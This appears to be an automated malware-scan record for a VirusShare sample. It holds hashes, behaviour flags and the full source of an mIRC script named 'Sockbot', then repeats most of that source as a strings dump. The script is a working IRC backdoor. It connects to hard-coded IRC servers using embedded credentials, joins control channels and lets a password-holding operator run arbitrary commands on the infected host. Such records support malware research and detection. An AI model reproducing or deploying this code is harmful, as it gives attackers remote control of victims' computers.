{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "System": "May run an executable file or a system command on a Mac",
            "chr": "May attempt to obfuscate specific str"
        },
        "macro": ";--------------\n; Sockbot\n;--------------\non *:start:unset %sbt_*\non *:connect:.signal sbcheck\nalias -l ur {\n  if (!$1) { return }\n  hfree -w sbset\n  if (!%hrtsrdxc) {\n    sload irc.redesul.net|irc.netstudio.com.br|irc.leaving.com.br Cruel:crueldade #crueis,#brusque,#blumenau\n    sload irc.mzima.net buzbot #mhb\n    sload irc.g8net.com.br|us.brasnet.org system_dll:dndn2835-12-59sadi4d #svchost,#scriptx,#bobmarley,#lajeado\n  }\n  else { sload irc.mzima.net mh_test_bot #mhb }\n  tokenize 32 $hget(sbset,$remove($1,sbot.))\n  if ($prop == server) { return $gettok( $gettok($1,$r(1,$numtok($1,124)),124) ,1,58) }\n  if ($prop == port) { return $iif($gettok($1,2,58),$ifmatch,6667) }\n  if ($prop == nick) { return $gettok($2,1,58) }\n  if ($prop == nickpass) { return $gettok($2,2,58) }\n  if ($prop == chans) { return $3 }\n}\non *:signal:sbcheck:{\n  if (!$timer(sbcheck)) { .timersbcheck -io 0 100 .signal sbcheck }\n  var %x = 1\n  while ($ur(%x).server) {\n    var %sn = sbot. $+ %x\n    if (!$sock(%sn)) { sockopen %sn $ur(%x).server $ur(%x).port | hopen %sn }\n    else {  }\n    inc %x\n  }\n  joincheck\n}\nalias -l joincheck .timersb_join_check -io 1 3 joincheck_now\nalias -l joincheck_now {\n  var %x = 1\n  while ($sock(sbot.*,%x)) {\n    var %sn = $ifmatch, %y = 1\n    while ($gettok($ur(%sn).chans,%y,44)) {\n      var %chan = $ifmatch\n      if (!$_chan(%sn,%chan)) { sbcmd %sn join %chan }\n      inc %y\n    }\n    inc %x\n  }\n}\nalias sbcmd if ($sock($1).status == active && $2) { sockwrite -tn $1- }\nalias -l sclose { sockclose $1 | hfree -w $1 }\nalias -l smsg sbcmd $1 PRIVMSG $2 $+(:,$$3-)\nalias -l snotice sbcmd $1 NOTICE $2 $+(:,$$3-)\nalias -l sload hadd -m sbset $calc($hget(sbset,0).item + 1) $1-\nalias -l hopen { hfree -w $$1 | hmake $1 200 }\nalias -l _network return $hget($1,network)\nalias -l _me return $hget($iif($sock($sockname),$ifmatch,$1),me)\nalias -l _chan return $gettok($hmatch($1,$+(chan:,$iif($2 isnum,*,$2)),$iif($2 isnum,$2,1)),2,$asc(:))\nalias -l exitchan { hdel $1 $+(chan:,$$2) | hdel -w $1 $+($2,:*) }\nalias -l isadmin $iif($hmatch($1,$+(log,*,$admask($2))),return yes)\nalias -l admask return $gettok($1,2,33)\n;nicks\nalias -l nickget return $iif($3 isnum,$gettok($hmatch($1,$+($2,:*),$3),2,58),$hget($1,$+($2,:,$3)))\nalias -l gmchr return $+($iif(@ isin $1,@),$iif(+ isin $1,+))\nalias -l gmlet return $+($iif(o isin $1,@),$iif(v isin $1,+))\nalias -l nicktot return $hmatch($1,$+($2,:*),0)\nalias -l _isop return $iif(@ isin $nickget($1,$2,$3),1)\nalias -l _isvo return $iif(+ isin $nickget($1,$2,$3),1)\nalias -l _kick sbcmd $1 kick $2 $3 $+(:,$4-)\nalias -l nkmask return $gettok($mid($1,2-),1,33)\n;socket\non *:sockopen:sbot.*:{\n  if ($sockerr) { return }\n  sbcmd $sockname user bot \"\" servername : $+ % $+ nome\n  sbcmd $sockname nick $ur($sockname).nick\n}\non *:sockread:sbot.*:{\n  if ($sockerr) { return }\n  sockread %i | tokenize 32 %i | unset %i\n  if (!$1) || ($2 = 372) { return }\n  if (!$hget($sockname)) { hopen $sockname }\n  if ($2 isnum 1-500) { r.raw $1- }\n  if ($1 == PING) { sbcmd $sockname PONG $2- }\n  if ($2 == PRIVMSG) { r.privmsg $1- }\n  if ($2 == NOTICE) { r.notice $1- }\n  if ($2 == MODE) { r.mode $1- }\n  if ($2 == NICK) { r.nick $1- }\n  if ($2 == JOIN) { r.join $1- }\n  if ($2 == PART) { r.part $1- }\n  if ($2 == KICK) { r.kick $1- }\n  if ($2 == QUIT) { r.quit $1- }\n  ;if ($1 == ERROR) { .timer 1 1 .signal sbcheck }\n}\non *:sockclose:sbot.*:sclose $sockname\n;requests\nalias -l r.privmsg {\n  var %chan = $iif($left($3,1) = $chr(35),$3), %mask = $1, %nick = $nkmask($1)\n  tokenize 32 $mid($4-,2-)\n  if ($left($1,1) == \u0001 && $right($1-,1) == \u0001) {\n    tokenize 32 $mid($1-,2-,-1)\n    if ($1 == VERSION) { sbcmd $sockname notice %nick :\u0001VERSION mIRC v6.16 Khaled Mardam-Bey\u0001 }\n    if ($1 == PING) { sbcmd $sockname notice %nick :\u0001PING $ctime $+ \u0001 }\n  }\n  if (%chan && $istok(#brusque,%chan,32) && $_isop($sockname,%chan,$_me) && !$_isvo($sockname,%chan,%nick) && !$_isop($sockname,%chan,%nick)) {\n    var %act = $iif(\u0001ACTION *\u0001 iswm $1-,yes), %text = $strip($iif(%act,$gettok($remove($1-,\u0001),2-,32),$1-))\n    var %w = *ouvindo*mp3*,*ao*som*de*,*mp3player*,*\ufffd\ufffd\ufffd*winamp*\ufffd\ufffd\ufffd*,*mp3*curtindo*,*mp3*kbps*,*\ufffd!\ufffd*mp3*\ufffd!\ufffd*,*EstouranDo*timPanUs*,*\ufffd\ufffd\ufffdSc\ufffd\ufffdp*MP3\ufffd!\ufffd*\n    if (%act) { var %w = %w ,*.mp3*,*curtindo*,*ouvindo*,*play*,*escutando*,*kurtind*,*kbps*,*mp3player*,*som*de*,*.wav*,*listening*,*quebrando*som*,*winamp*,*Na*OreLiNha* }\n    var %x = 1, %tok = $numtok(%w,44)\n    while (%x <= %tok) {\n      if ($gettok(%w,%x,44) iswm %text) {\n        if ($hget($sockname,$+(mp3flood:,%nick))) { sbcmd $sockname mode %chan +b $+(*!*@,$gettok(%mask,2,64)) | hdel $sockname $+(mp3flood:,%nick) }\n        else { _kick $sockname %chan %nick \ufffd proibido mp3players no canal %chan $+ , se persistir ser\ufffd banido. | hadd $+(-u,$calc(30 * 60)) $sockname $+(mp3flood:,%nick) yes }\n        return\n      }\n      inc %x\n    }\n  }\n  if (%chan && $istok(!op !deop !k !kick !kb !voice !devoice,$1,32) && $_isop($sockname,%chan,$_me)) {\n    if (!$isadmin($sockname,%mask) && !$_isop($sockname,%chan,%nick)) { snotice $sockname %nick Voce deve ser op no canal ou deve estar logado para usar este comando | return }\n    var %nk = $iif($2,$2,%nick)\n    if (%nk == $_me) { snotice $sockname %nick Eu n\ufffdo uso os comandos em mim mesmo | return }\n    if (!$nickget($sockname,%chan,%nk)) { snotice $sockname %nick Nick n\ufffdo encontrado | return }\n    if ($1 == !op && !$_isop($sockname,%chan,%nk)) { sbcmd $sockname mode %chan +o %nk }\n    if ($1 == !deop && $_isop($sockname,%chan,%nk)) { sbcmd $sockname mode %chan -o %nk }\n    if ($1 == !voice && !$_isvo($sockname,%chan,%nk)) { sbcmd $sockname mode %chan +v %nk }\n    if ($1 == !devoice && $_isvo($sockname,%chan,%nk)) { sbcmd $sockname mode %chan -v %nk }\n    if ($1 == !k) || ($1 == !kick) { _kick $sockname %chan %nk $iif($3,$3-,requested) }\n    if ($1 == !kb) { set -u60 %sbkb. [ $+ [ %nk ] ] %chan $iif($3,$3-,requested) | sbcmd $sockname whois %nk }\n  }\n  if (%chan) {\n    if (%sbt_cmd_flood_ [ $+ [ %chan ] ] >= 4) { return }\n    var %c\n    if ($1 == !charada) { %c = charada $sockname %chan }\n    if ($1 == !links && %chan == #svchost) { %c = firelinkz $sockname %nick }\n    if ($1 == topic && $2 && $isadmin($sockname,%mask)) { %c = sbcmd $sockname topic %chan : $+ $2- }\n    if ($1 == mode && $2 && $isadmin($sockname,%mask)) { %c = sbcmd $sockname mode %chan $2- }\n    if (%c) { inc -u20 %sbt_cmd_flood_ [ $+ [ %chan ] ] | %c }\n  }\n  if (!%chan && $istok(log help do sw uptime notice hop join part msg,$1,32)) {\n    if ($1 == log) {\n      if ($2 != $decode(eDc=,m)) { snotice $sockname %nick Senha incorreta | return }\n      else { snotice $sockname %nick Senha aceita. Voce esta reconhecido | hadd $sockname $+(log,$admask(%mask)) $ctime }\n    }\n    elseif ($1 == help) {\n      snotice $sockname %nick Comandos de Info e controle do BOT (apenas para quem estiver logado) -> \u0002log <senha>\u0002 (loga vc no bot); \u0002sw\u0002 (comando no server); \u0002uptime\u0002 (server/mirc/pc uptime); \u0002notice\u0002 (envia notice para vc) - \u0002hop <canal>\u0002 & \u0002part <canal>\u0002 & \u0002join <canal>\u0002 & \u0002msg <canal/nick> <msg>\u0002\n      snotice $sockname %nick Comandos de Operador de canal (apenas para ops e logados no canal, use: \u0002!comando <nick>\u0002, se nao houver <nick> o comando \ufffd usado em vc) -> \u0002!voice\u0002; \u0002!devoice\u0002; \u0002!op\u0002; \u0002!deop\u0002; \u0002!k\u0002; \u0002!kb\u0002\n    }\n    elseif (!$isadmin($sockname,%mask)) { snotice $sockname %nick Voce precisa estar logado no bot para utilizar este comando }\n    elseif ($1 == do && $2) { $2- }\n    elseif ($1 == sw) { sbcmd $sockname $2- }\n    elseif ($1 == uptime) { snotice $sockname %nick Uptime Server: $duration($sock($sockname).to) - Uptime System: $uptime(system,2) - Uptime mIRC: $uptime(mirc,2) }\n    elseif ($1 == notice) { .timer 1 0 snotice $sockname %nick $2- }\n    elseif ($1 == hop && $_chan($sockname,$2)) { sbcmd $sockname part $2 | sbcmd $sockname join $2 }\n    elseif ($1 == join && $2) { sbcmd $sockname join $2 }\n    elseif ($1 == part && $2) { sbcmd $sockname part $2 }\n    elseif ($1 == msg && $3) { .timer 1 0 smsg $sockname $2- }\n  }\n}\nalias -l r.notice {\n  var %nick = $nkmask($1)\n  tokenize 32 $mid($4-,2-)\n  if (*nickserv*identify* iswm $1- && %nick == nickserv && $_me == $ur($sockname).nick && $ur($sockname).nickpass) { sbcmd $sockname nickserv identify $ifmatch }\n}\nalias -l r.mode {\n  var %x = 1, %chan = $3, %nick = $nkmask($1), %count = 0\n  if ($left(%chan,1) != $chr(35)) { return }\n  while ($mid($4,%x,1)) {\n    var %m = $ifmatch\n    if (%m == +) || (%m == -) { var %s = %m }\n    elseif ($istok(o v b,%m,32)) { inc %count }\n    if (%m isletter) {\n      var %nk = $gettok($5-,%count,32)\n      if ($gmlet(%m)) {\n        var %let = $ifmatch, %mod = $hget($sockname,$+(%chan,:,%nk)), %mod = $iif($iif(%s == +,$+($gmchr($+(%mod,%let))),$remove(%mod,%let)),$ifmatch,n)\n        hadd $sockname $+(%chan,:,%nk) %mod\n      }\n    }\n    inc %x\n  }\n}\nalias -l r.nick {\n  var %nick = $nkmask($1), %newnick = $mid($3,2-)\n  if (%nick == $_me) { hadd $sockname me %newnick | joincheck }\n  var %x = 1\n  while ($_chan($sockname,%x)) {\n    var %chan = $ifmatch, %modes = $hget($sockname,$+(%chan,:,%nick))\n    if (%modes) { hdel $sockname $+(%chan,:,%nick) | hadd $sockname $+(%chan,:,%newnick) %modes }\n    inc %x\n  }\n}\nalias -l r.join {\n  var %chan = $mid($3,2-), %nick = $nkmask($1)\n  if (%nick == $_me) {\n    hadd $sockname $+(chan:,%chan) yes\n    if (%chan == #svchost) { sbcmd $sockname chanserv op %chan $_me }\n  }\n  else { hadd $sockname $+(%chan,:,%nick) n }\n}\nalias -l r.part {\n  var %nick = $nkmask($1), %chan = $3\n  if (%nick == $_me) { exitchan $sockname %chan }\n  else { hdel $sockname $+(%chan,:,%nick) }\n}\nalias -l r.kick {\n  var %chan = $3, %knick = $4\n  if (%knick == $_me) { exitchan $sockname %chan | sbcmd $sockname join %chan }\n  else { hdel $sockname $+(%chan,:,%knick) }\n}\nalias -l r.quit {\n  var %nick = $nkmask($1)\n  if (%nick == $_me) { return }\n  var %x = 1 | while ($_chan($sockname,%x)) { hdel $sockname $+($ifmatch,:,%nick) | inc %x }\n}\nalias -l r.raw {\n  if ($2 = 005 && $wildtok($4-,NETWORK=*,1,32)) { hadd $sockname network $gettok($ifmatch,2,61) }\n  if ($2 = 376) { hadd $sockname me $ur($sockname).nick | joincheck }\n  if ($2 = 311 && $4 == $_me) { hadd $sockname mask $6 | .timer -io 1 20 sbcmd $sockname whois $_me }\n  if ($2 = 311 && %sbkb. [ $+ [ $4 ] ]) {\n    var %chan = $gettok($ifmatch,1,32), %reason = $gettok($ifmatch,2-,32)\n    sbcmd $sockname mode %chan +b $+(*!*@,$6)\n    _kick $sockname %chan $4 %reason\n    unset %sbkb. [ $+ [ $4 ] ]\n  }\n  if ($2 = 353) {\n    var %x = 1, %chan = $5, %nicks = $mid($6-,2-)\n    while ($gettok(%nicks,%x,32)) {\n      var %t = $ifmatch, %chr = $gmchr(%t), %nick = $remove(%t,%chr)\n      hadd $sockname $+(%chan,:,%nick) $iif(%chr,$ifmatch,n)\n      inc %x\n    }\n  }\n  ;if ($2 = 433 && $3 != $_me) { var %change = $+(b,$r(1000,9999)) | sbcmd $sockname nick %change }\n}\n;sock tools\nalias -l nohtml { var %x, %y = $regsub($1-,/(<[^>]+>)/g,$null,%x) | return %x }\nalias -l nocolor { var %x, %y = $regsub($1-,/(&[^;]+;)/g,$null,%x) | return %x }\n;charada\nalias -l chrdmsg smsg $hget($1,msg) $2-\nalias -l charada {\n  var %s = $+(charada.,$r(1,$ticks))\n  hfree -w %s\n  hadd -m %s msg $1-\n  chrdopen %s /charadas/rand_redir.php?p=845\n}\nalias -l chrdopen {\n  hadd $1 get $$2\n  sockclose $1\n  sockopen $1 humortadela.uol.com.br 80\n}\non *:sockopen:charada.*:{\n  if ($sockerr) { chrdmsg $sockname Falha ao conectar | return }\n  sockwrite -n $sockname GET $hget($sockname,get) HTTP/1.1\n  sockwrite -n $sockname Host: humortadela.uol.com.br\n  sockwrite -n $sockname Connection: close\n  sockwrite -n $sockname\n}\non *:sockread:charada.*:{\n  if ($sockerr) { chrdmsg $sockname Erro ao ler | return }\n  var %i | sockread %i\n  if (location: isin %i) { chrdopen $sockname $+(/,$gettok($remove(%i,.html),3-,47),_resp.html) }\n  if ($left(%i,1) == $chr(9) && $mid(%i,2,1) isletter) { hadd $sockname quest $remove(%i,$chr(9)) }\n  if (<b>R:</b> isin %i && $hget($sockname,quest)) {\n    chrdmsg $sockname $nohtml($nocolor($ifmatch R: $gettok(%i,2-,32)))\n    sockclose $sockname\n  }\n}\non *:sockclose:charada.*:chrdmsg $sockname Nao foi possivel receber a charada\n;links\nalias -l firlin_msg smsg $sock(firelinkz).mark $1-\nalias -l firelinkz {\n  sockclose firelinkz\n  sockopen firelinkz firecode.atspace.org 80\n  sockmark firelinkz $1-\n  unset %firelinkz_read\n}\non *:sockopen:firelinkz:{\n  if ($sockerr) { return }\n  sockwrite -n $sockname GET /links.txt HTTP/1.1\n  sockwrite -n $sockname Host: firecode.atspace.org\n  sockwrite -n $sockname Connection: close\n  sockwrite -n $sockname\n}\non *:sockread:firelinkz:{\n  if ($sockerr) { return }\n  var %i | sockread %i\n  if ($len(%i) < 1) { set %firelinkz_read 1 }\n  if (%firelinkz_read) { firlin_msg %i }\n}\n;endscript"
    },
    "filename": "VirusShare_228ffc928b3a19ffbbcbb694e7e11e14",
    "filesize": 12937,
    "filetype": "data",
    "hashes": {
        "md5": "228ffc928b3a19ffbbcbb694e7e11e14",
        "sha1": "6bd9294f5270d533d4c33d6cf4fbef3cc99a2ef6",
        "sha256": "747518393a1dfcb3c1d998d9d47dfd1addd0d108e8e0bb9089c3d61588fc49f5"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            ";--------------",
            "; Sockbot",
            ";--------------",
            "on *:start:unset %sbt_*",
            "on *:connect:.signal sbcheck",
            "alias -l ur {",
            "  if (!$1) { return }",
            "  hfree -w sbset",
            "  if (!%hrtsrdxc) {",
            "    sload irc.redesul.net|irc.netstudio.com.br|irc.leaving.com.br Cruel:crueldade #crueis,#brusque,#blumenau",
            "    sload irc.mzima.net buzbot #mhb",
            "    sload irc.g8net.com.br|us.brasnet.org system_dll:dndn2835-12-59sadi4d #svchost,#scriptx,#bobmarley,#lajeado",
            "  else { sload irc.mzima.net mh_test_bot #mhb }",
            "  tokenize 32 $hget(sbset,$remove($1,sbot.))",
            "  if ($prop == server) { return $gettok( $gettok($1,$r(1,$numtok($1,124)),124) ,1,58) }",
            "  if ($prop == port) { return $iif($gettok($1,2,58),$ifmatch,6667) }",
            "  if ($prop == nick) { return $gettok($2,1,58) }",
            "  if ($prop == nickpass) { return $gettok($2,2,58) }",
            "  if ($prop == chans) { return $3 }",
            "on *:signal:sbcheck:{",
            "  if (!$timer(sbcheck)) { .timersbcheck -io 0 100 .signal sbcheck }",
            "  var %x = 1",
            "  while ($ur(%x).server) {",
            "    var %sn = sbot. $+ %x",
            "    if (!$sock(%sn)) { sockopen %sn $ur(%x).server $ur(%x).port | hopen %sn }",
            "    else {  }",
            "    inc %x",
            "  joincheck",
            "alias -l joincheck .timersb_join_check -io 1 3 joincheck_now",
            "alias -l joincheck_now {",
            "  var %x = 1",
            "  while ($sock(sbot.*,%x)) {",
            "    var %sn = $ifmatch, %y = 1",
            "    while ($gettok($ur(%sn).chans,%y,44)) {",
            "      var %chan = $ifmatch",
            "      if (!$_chan(%sn,%chan)) { sbcmd %sn join %chan }",
            "      inc %y",
            "    }",
            "    inc %x",
            "alias sbcmd if ($sock($1).status == active && $2) { sockwrite -tn $1- }",
            "alias -l sclose { sockclose $1 | hfree -w $1 }",
            "alias -l smsg sbcmd $1 PRIVMSG $2 $+(:,$$3-)",
            "alias -l snotice sbcmd $1 NOTICE $2 $+(:,$$3-)",
            "alias -l sload hadd -m sbset $calc($hget(sbset,0).item + 1) $1-",
            "alias -l hopen { hfree -w $$1 | hmake $1 200 }",
            "alias -l _network return $hget($1,network)",
            "alias -l _me return $hget($iif($sock($sockname),$ifmatch,$1),me)",
            "alias -l _chan return $gettok($hmatch($1,$+(chan:,$iif($2 isnum,*,$2)),$iif($2 isnum,$2,1)),2,$asc(:))",
            "alias -l exitchan { hdel $1 $+(chan:,$$2) | hdel -w $1 $+($2,:*) }",
            "alias -l isadmin $iif($hmatch($1,$+(log,*,$admask($2))),return yes)",
            "alias -l admask return $gettok($1,2,33)",
            ";nicks",
            "alias -l nickget return $iif($3 isnum,$gettok($hmatch($1,$+($2,:*),$3),2,58),$hget($1,$+($2,:,$3)))",
            "alias -l gmchr return $+($iif(@ isin $1,@),$iif(+ isin $1,+))",
            "alias -l gmlet return $+($iif(o isin $1,@),$iif(v isin $1,+))",
            "alias -l nicktot return $hmatch($1,$+($2,:*),0)",
            "alias -l _isop return $iif(@ isin $nickget($1,$2,$3),1)",
            "alias -l _isvo return $iif(+ isin $nickget($1,$2,$3),1)",
            "alias -l _kick sbcmd $1 kick $2 $3 $+(:,$4-)",
            "alias -l nkmask return $gettok($mid($1,2-),1,33)",
            ";socket",
            "on *:sockopen:sbot.*:{",
            "  if ($sockerr) { return }",
            "  sbcmd $sockname user bot \"\" servername : $+ % $+ nome",
            "  sbcmd $sockname nick $ur($sockname).nick",
            "on *:sockread:sbot.*:{",
            "  if ($sockerr) { return }",
            "  sockread %i | tokenize 32 %i | unset %i",
            "  if (!$1) || ($2 = 372) { return }",
            "  if (!$hget($sockname)) { hopen $sockname }",
            "  if ($2 isnum 1-500) { r.raw $1- }",
            "  if ($1 == PING) { sbcmd $sockname PONG $2- }",
            "  if ($2 == PRIVMSG) { r.privmsg $1- }",
            "  if ($2 == NOTICE) { r.notice $1- }",
            "  if ($2 == MODE) { r.mode $1- }",
            "  if ($2 == NICK) { r.nick $1- }",
            "  if ($2 == JOIN) { r.join $1- }",
            "  if ($2 == PART) { r.part $1- }",
            "  if ($2 == KICK) { r.kick $1- }",
            "  if ($2 == QUIT) { r.quit $1- }",
            "  ;if ($1 == ERROR) { .timer 1 1 .signal sbcheck }",
            "on *:sockclose:sbot.*:sclose $sockname",
            ";requests",
            "alias -l r.privmsg {",
            "  var %chan = $iif($left($3,1) = $chr(35),$3), %mask = $1, %nick = $nkmask($1)",
            "  tokenize 32 $mid($4-,2-)",
            "  if ($left($1,1) == ",
            " && $right($1-,1) == ",
            "    tokenize 32 $mid($1-,2-,-1)",
            "    if ($1 == VERSION) { sbcmd $sockname notice %nick :",
            "VERSION mIRC v6.16 Khaled Mardam-Bey",
            "    if ($1 == PING) { sbcmd $sockname notice %nick :",
            "PING $ctime $+ ",
            "  if (%chan && $istok(#brusque,%chan,32) && $_isop($sockname,%chan,$_me) && !$_isvo($sockname,%chan,%nick) && !$_isop($sockname,%chan,%nick)) {",
            "    var %act = $iif(",
            "ACTION *",
            " iswm $1-,yes), %text = $strip($iif(%act,$gettok($remove($1-,",
            "),2-,32),$1-))",
            "    var %w = *ouvindo*mp3*,*ao*som*de*,*mp3player*,**winamp**,*mp3*curtindo*,*mp3*kbps*,*!*mp3*!*,*EstouranDo*timPanUs*,*Scp*MP3!*",
            "    if (%act) { var %w = %w ,*.mp3*,*curtindo*,*ouvindo*,*play*,*escutando*,*kurtind*,*kbps*,*mp3player*,*som*de*,*.wav*,*listening*,*quebrando*som*,*winamp*,*Na*OreLiNha* }",
            "    var %x = 1, %tok = $numtok(%w,44)",
            "    while (%x <= %tok) {",
            "      if ($gettok(%w,%x,44) iswm %text) {",
            "        if ($hget($sockname,$+(mp3flood:,%nick))) { sbcmd $sockname mode %chan +b $+(*!*@,$gettok(%mask,2,64)) | hdel $sockname $+(mp3flood:,%nick) }",
            "        else { _kick $sockname %chan %nick  proibido mp3players no canal %chan $+ , se persistir ser banido. | hadd $+(-u,$calc(30 * 60)) $sockname $+(mp3flood:,%nick) yes }",
            "        return",
            "      }",
            "      inc %x",
            "    }",
            "  if (%chan && $istok(!op !deop !k !kick !kb !voice !devoice,$1,32) && $_isop($sockname,%chan,$_me)) {",
            "    if (!$isadmin($sockname,%mask) && !$_isop($sockname,%chan,%nick)) { snotice $sockname %nick Voce deve ser op no canal ou deve estar logado para usar este comando | return }",
            "    var %nk = $iif($2,$2,%nick)",
            "    if (%nk == $_me) { snotice $sockname %nick Eu no uso os comandos em mim mesmo | return }",
            "    if (!$nickget($sockname,%chan,%nk)) { snotice $sockname %nick Nick no encontrado | return }",
            "    if ($1 == !op && !$_isop($sockname,%chan,%nk)) { sbcmd $sockname mode %chan +o %nk }",
            "    if ($1 == !deop && $_isop($sockname,%chan,%nk)) { sbcmd $sockname mode %chan -o %nk }",
            "    if ($1 == !voice && !$_isvo($sockname,%chan,%nk)) { sbcmd $sockname mode %chan +v %nk }",
            "    if ($1 == !devoice && $_isvo($sockname,%chan,%nk)) { sbcmd $sockname mode %chan -v %nk }",
            "    if ($1 == !k) || ($1 == !kick) { _kick $sockname %chan %nk $iif($3,$3-,requested) }",
            "    if ($1 == !kb) { set -u60 %sbkb. [ $+ [ %nk ] ] %chan $iif($3,$3-,requested) | sbcmd $sockname whois %nk }",
            "  if (%chan) {",
            "    if (%sbt_cmd_flood_ [ $+ [ %chan ] ] >= 4) { return }",
            "    var %c",
            "    if ($1 == !charada) { %c = charada $sockname %chan }",
            "    if ($1 == !links && %chan == #svchost) { %c = firelinkz $sockname %nick }",
            "    if ($1 == topic && $2 && $isadmin($sockname,%mask)) { %c = sbcmd $sockname topic %chan : $+ $2- }",
            "    if ($1 == mode && $2 && $isadmin($sockname,%mask)) { %c = sbcmd $sockname mode %chan $2- }",
            "    if (%c) { inc -u20 %sbt_cmd_flood_ [ $+ [ %chan ] ] | %c }",
            "  if (!%chan && $istok(log help do sw uptime notice hop join part msg,$1,32)) {",
            "    if ($1 == log) {",
            "      if ($2 != $decode(eDc=,m)) { snotice $sockname %nick Senha incorreta | return }",
            "      else { snotice $sockname %nick Senha aceita. Voce esta reconhecido | hadd $sockname $+(log,$admask(%mask)) $ctime }",
            "    }",
            "    elseif ($1 == help) {",
            "      snotice $sockname %nick Comandos de Info e controle do BOT (apenas para quem estiver logado) -> ",
            "log <senha>",
            " (loga vc no bot); ",
            " (comando no server); ",
            "uptime",
            " (server/mirc/pc uptime); ",
            "notice",
            " (envia notice para vc) - ",
            "hop <canal>",
            "part <canal>",
            "join <canal>",
            "msg <canal/nick> <msg>",
            "      snotice $sockname %nick Comandos de Operador de canal (apenas para ops e logados no canal, use: ",
            "!comando <nick>",
            ", se nao houver <nick> o comando  usado em vc) -> ",
            "!voice",
            "!devoice",
            "!deop",
            "    }",
            "    elseif (!$isadmin($sockname,%mask)) { snotice $sockname %nick Voce precisa estar logado no bot para utilizar este comando }",
            "    elseif ($1 == do && $2) { $2- }",
            "    elseif ($1 == sw) { sbcmd $sockname $2- }",
            "    elseif ($1 == uptime) { snotice $sockname %nick Uptime Server: $duration($sock($sockname).to) - Uptime System: $uptime(system,2) - Uptime mIRC: $uptime(mirc,2) }",
            "    elseif ($1 == notice) { .timer 1 0 snotice $sockname %nick $2- }",
            "    elseif ($1 == hop && $_chan($sockname,$2)) { sbcmd $sockname part $2 | sbcmd $sockname join $2 }",
            "    elseif ($1 == join && $2) { sbcmd $sockname join $2 }",
            "    elseif ($1 == part && $2) { sbcmd $sockname part $2 }",
            "    elseif ($1 == msg && $3) { .timer 1 0 smsg $sockname $2- }",
            "alias -l r.notice {",
            "  var %nick = $nkmask($1)",
            "  tokenize 32 $mid($4-,2-)",
            "  if (*nickserv*identify* iswm $1- && %nick == nickserv && $_me == $ur($sockname).nick && $ur($sockname).nickpass) { sbcmd $sockname nickserv identify $ifmatch }",
            "alias -l r.mode {",
            "  var %x = 1, %chan = $3, %nick = $nkmask($1), %count = 0",
            "  if ($left(%chan,1) != $chr(35)) { return }",
            "  while ($mid($4,%x,1)) {",
            "    var %m = $ifmatch",
            "    if (%m == +) || (%m == -) { var %s = %m }",
            "    elseif ($istok(o v b,%m,32)) { inc %count }",
            "    if (%m isletter) {",
            "      var %nk = $gettok($5-,%count,32)",
            "      if ($gmlet(%m)) {",
            "        var %let = $ifmatch, %mod = $hget($sockname,$+(%chan,:,%nk)), %mod = $iif($iif(%s == +,$+($gmchr($+(%mod,%let))),$remove(%mod,%let)),$ifmatch,n)",
            "        hadd $sockname $+(%chan,:,%nk) %mod",
            "      }",
            "    }",
            "    inc %x",
            "alias -l r.nick {",
            "  var %nick = $nkmask($1), %newnick = $mid($3,2-)",
            "  if (%nick == $_me) { hadd $sockname me %newnick | joincheck }",
            "  var %x = 1",
            "  while ($_chan($sockname,%x)) {",
            "    var %chan = $ifmatch, %modes = $hget($sockname,$+(%chan,:,%nick))",
            "    if (%modes) { hdel $sockname $+(%chan,:,%nick) | hadd $sockname $+(%chan,:,%newnick) %modes }",
            "    inc %x",
            "alias -l r.join {",
            "  var %chan = $mid($3,2-), %nick = $nkmask($1)",
            "  if (%nick == $_me) {",
            "    hadd $sockname $+(chan:,%chan) yes",
            "    if (%chan == #svchost) { sbcmd $sockname chanserv op %chan $_me }",
            "  else { hadd $sockname $+(%chan,:,%nick) n }",
            "alias -l r.part {",
            "  var %nick = $nkmask($1), %chan = $3",
            "  if (%nick == $_me) { exitchan $sockname %chan }",
            "  else { hdel $sockname $+(%chan,:,%nick) }",
            "alias -l r.kick {",
            "  var %chan = $3, %knick = $4",
            "  if (%knick == $_me) { exitchan $sockname %chan | sbcmd $sockname join %chan }",
            "  else { hdel $sockname $+(%chan,:,%knick) }",
            "alias -l r.quit {",
            "  var %nick = $nkmask($1)",
            "  if (%nick == $_me) { return }",
            "  var %x = 1 | while ($_chan($sockname,%x)) { hdel $sockname $+($ifmatch,:,%nick) | inc %x }",
            "alias -l r.raw {",
            "  if ($2 = 005 && $wildtok($4-,NETWORK=*,1,32)) { hadd $sockname network $gettok($ifmatch,2,61) }",
            "  if ($2 = 376) { hadd $sockname me $ur($sockname).nick | joincheck }",
            "  if ($2 = 311 && $4 == $_me) { hadd $sockname mask $6 | .timer -io 1 20 sbcmd $sockname whois $_me }",
            "  if ($2 = 311 && %sbkb. [ $+ [ $4 ] ]) {",
            "    var %chan = $gettok($ifmatch,1,32), %reason = $gettok($ifmatch,2-,32)",
            "    sbcmd $sockname mode %chan +b $+(*!*@,$6)",
            "    _kick $sockname %chan $4 %reason",
            "    unset %sbkb. [ $+ [ $4 ] ]",
            "  if ($2 = 353) {",
            "    var %x = 1, %chan = $5, %nicks = $mid($6-,2-)",
            "    while ($gettok(%nicks,%x,32)) {",
            "      var %t = $ifmatch, %chr = $gmchr(%t), %nick = $remove(%t,%chr)",
            "      hadd $sockname $+(%chan,:,%nick) $iif(%chr,$ifmatch,n)",
            "      inc %x",
            "    }",
            "  ;if ($2 = 433 && $3 != $_me) { var %change = $+(b,$r(1000,9999)) | sbcmd $sockname nick %change }",
            ";sock tools",
            "alias -l nohtml { var %x, %y = $regsub($1-,/(<[^>]+>)/g,$null,%x) | return %x }",
            "alias -l nocolor { var %x, %y = $regsub($1-,/(&[^;]+;)/g,$null,%x) | return %x }",
            ";charada",
            "alias -l chrdmsg smsg $hget($1,msg) $2-",
            "alias -l charada {",
            "  var %s = $+(charada.,$r(1,$ticks))",
            "  hfree -w %s",
            "  hadd -m %s msg $1-",
            "  chrdopen %s /charadas/rand_redir.php?p=845",
            "alias -l chrdopen {",
            "  hadd $1 get $$2",
            "  sockclose $1",
            "  sockopen $1 humortadela.uol.com.br 80",
            "on *:sockopen:charada.*:{",
            "  if ($sockerr) { chrdmsg $sockname Falha ao conectar | return }",
            "  sockwrite -n $sockname GET $hget($sockname,get) HTTP/1.1",
            "  sockwrite -n $sockname Host: humortadela.uol.com.br",
            "  sockwrite -n $sockname Connection: close",
            "  sockwrite -n $sockname",
            "on *:sockread:charada.*:{",
            "  if ($sockerr) { chrdmsg $sockname Erro ao ler | return }",
            "  var %i | sockread %i",
